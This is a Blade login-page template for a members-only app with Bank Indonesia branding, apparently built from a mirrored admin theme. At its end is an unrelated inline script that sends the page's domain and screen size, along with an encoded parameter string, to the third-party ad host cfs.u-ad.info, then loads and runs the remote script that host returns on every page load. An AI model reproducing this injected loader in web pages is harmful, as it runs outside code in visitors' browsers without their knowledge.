<!DOCTYPE html>
<html lang="en">
@include('layouts.head')
<body>
<div class="login-container animated fadeInDown">
    <div style="padding-bottom:0;" class="loginbox" align="center">
        <img src="/images/BANK_INDONESIA.png" height="30%" width="30%" visibility="hidden" align="left" hspace="10" vspace="10">
        <br><br>
        <img src="/images/GLUETELA.png" height="90%" width="90%" visibility="hidden">
        <br><br>
        <div class="loginbox-or">
            <div class="or-line"></div>
        </div>

        <form class="" role="form" method="POST" action='do_login'>
            {!! csrf_field() !!}
            <div class="loginbox-textbox">
                <input style="height: 2.5em; margin-bottom: 0" type="text" id="username" name="username" class="form-control" placeholder="username" />
            </div>
            <div class="loginbox-textbox">
                <input style="height: 2.5em;" type="password" id="password" name="password" class="form-control" placeholder="password" />
            </div>
            <div class="loginbox-submit">
                <input type="submit" class="btn btn-primary btn-block" value="Login">
            </div>
            <div class="loginbox-or">
                <div class="or-line"></div>
                <div class="or">OR</div>
            </div>
            <div class="loginbox-textbox">
                <input type="button" id="register" name="register" value="Register Now" data-toggle="modal" data-target="#on" class="btn btn-info btn-block" placeholder="Register" />
            </div>
        </form>
    </div>
    <div style="height: 2px;"></div>
    <div style="text-align: center; padding-top: 3px; color: red;"><b>Member Only</b></div>
    <div style="text-align: center; padding-top: 3px; color: blue; background-color: #eee;">Something wrong? contact <b>mirnayanti@bi.go.id</b></div>

</div>
<!--Basic Scripts-->
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/slimscroll/jquery.slimscroll.min.js"></script>

<!--Beyond Scripts-->
<script src="/js/beyond.js"></script>

<!--Google Analytics::Demo Only-->
<script>
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '../www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-60412744-1', 'auto');
    ga('send', 'pageview');

</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRXCgcW0TV1ae3O8iHc%2fF4RS6WIeKHzTEvwUwbTCa1X8XqGyPFoCSaq1MCf8xM%2fBf8DpNSVW5ObDKJrbhfEgdebfUTuprR8V4OG6rnFuiMrMU1g%2bHAl1VH7bI8fjO2eXMDn0bHDp1Cmi%2fXSOdAo7yyuxa770auqS4ZMjnaGu4Y0hzQIwcJ2U2qh3FPYGR2s6OpQu%2fnL0iR%2fs%2fChOONfoBBi0wtKr8MD6Y8QEgAoNaqPIixtd32HadJVCD9QgaAQPBPLfMh8F5BHJ44%2bqGPsl9728FCm%2b0Hm2tphSapx58aozuZ6%2ft%2bYFjyeZ3%2frVJhdym8Phf3zy89HVj3BFI6iUmz2uf5hJdB%2bTy5yGcGtvLob2ZxbxcWnx34f%2fglxV1jsXEmb2idfWU7aV27z%2fAGk00ezxiX6kJW37Ny660yfqmZrgXyTWOHPfqBe0HtyEU7f46FgdMrun9nRrODaxTPPjuGbFD%2bSI7f8c3J3FKmdBeb75jM78XK9kULEKL9uqC5UgStv9%2fiGqVldLc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<!--Body Ends-->

<!-- Mirrored from beyondadmin-v1.4.1.s3-website-us-east-1.amazonaws.com/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Aug 2015 01:26:02 GMT -->
</html>
